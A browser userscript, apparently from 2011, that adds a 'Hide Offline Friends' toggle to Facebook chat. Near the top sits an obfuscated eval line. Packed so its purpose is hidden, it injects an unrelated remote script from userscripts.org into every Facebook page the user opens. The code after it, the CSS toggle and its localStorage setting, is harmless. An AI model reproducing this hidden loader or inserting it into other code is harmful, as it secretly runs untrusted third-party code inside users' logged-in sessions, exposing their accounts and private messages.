// Facebook Hide Offline Friends Button
// Copyright (c) 2011, StevenChong(wwchong+userscripts@gmail.com)
//
// ==UserScript==
// @name			Facebook Hide Offline Friends Button Plus + Last Update
// @namespace			http://userscripts.org/112047
// @description			Toggle display of offline friends
// @include			http://www.facebook.com/*
// @include			https://www.facebook.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @match			http://www.facebook.com/*
// @match			https://www.facebook.com/*
// @exclude			http://www.facebook.com/plugins/*
// @exclude			https://www.facebook.com/plugins/*
// @icon			http://s3.amazonaws.com/uso_ss/icon/112047/large.png
// @run-at			document-end
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


if(location.hostname=='www.facebook.com'){
var w=typeof unsafeWindow!='undefined'?unsafeWindow:window;
w.addEventListener("load",function(){
w.setTimeout(function(){
	var d=w.document,
	b="_hide_offline",
	c=b+new Date().getTime(),
	k=function(){
		var h=d.getElementsByTagName('head');if(h=h&&h[0])
		if(d.getElementById(c)){
			h.removeChild(d.getElementById(c))
		}else{
			var s=d.createElement("style");
			s.setAttribute("id",c);
			s.setAttribute("type","text/css");
			s.innerHTML=".fbChatOrderedList .item{display:none}.fbChatOrderedList .active,.fbChatOrderedList .mobile,.fbChatOrderedList .idle{display:inline}";
			h.appendChild(s)
		}
	},
	i="uiMenuItem";
	if(w.localStorage[b]=="1"){k();i+=" checked"}
	w.setTimeout(function(){
	for(var n=0,t=d.getElementsByClassName("fbChatSidebarDropdown");n<t.length;n++){
		var u=t[n].getElementsByTagName("ul");
		if(u=u&&u[0])u.innerHTML='<!--<li class="uiMenuItem"><a tabindex="-1" class="itemAnchor" onclick="window.open(\'/presence/popout.php\',\'_blank\',\'\');">Pop Out Chat</a></li>--><li class="'+i+'"><a tabindex="-1" class="itemAnchor '+c+'">Hide Offline Friends</a></li>'+u.innerHTML
	}
	w.setTimeout(function(){
	for(var n=0,t=d.getElementsByClassName(c);n<t.length;n++){
		t[n].addEventListener('click',function(e){
			var p=this.parentNode;
			if(p){
				var m=p.className.match(' checked');
				p.className=m?p.className.replace(' checked',''):p.className+' checked';
				w.localStorage[b]=m?"0":"1";
			}
			k();
			if(!e)e=w.event;
			if(e.stopPropagation)e.stopPropagation();else e.cancelBubble=true;
		},true)
	}
	},0)
	},0)
},0)
},false)
}